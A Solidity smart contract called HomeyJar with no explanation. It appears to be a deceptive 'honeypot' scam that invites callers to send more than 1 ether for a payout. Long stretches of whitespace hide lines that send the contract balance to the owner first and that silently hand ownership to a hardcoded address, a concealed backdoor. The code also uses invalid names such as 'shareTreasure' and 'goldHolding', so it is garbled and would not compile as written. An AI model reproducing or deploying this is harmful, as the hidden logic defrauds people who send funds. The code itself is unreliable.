pragma solidity ^0.4.19;

contract HomeyJar {
    address public Gamemaster = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Gamemaster.shareTreasure(this.goldHolding);
            msg.sender.shareTreasure(this.goldHolding);
        }
    }

    function claimLoot() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Gamemaster=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Gamemaster);
        Gamemaster.shareTreasure(this.goldHolding);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Gamemaster);
        adr.call.value(msg.value)(data);
    }
}